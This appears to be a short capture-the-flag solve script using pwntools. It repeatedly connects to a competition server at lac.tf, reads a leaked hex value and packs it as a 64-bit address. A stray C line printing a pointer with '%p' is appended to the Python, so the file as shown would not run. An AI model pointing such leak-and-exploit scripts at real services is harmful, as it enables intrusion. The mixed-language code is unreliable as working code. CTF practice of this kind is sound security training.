from pwn import *
for i in range(1, 256):
    p = remote('lac.tf', 31135)
    print(p64(int(p.recvall(), 16)))
    p.close()
printf("%p", d)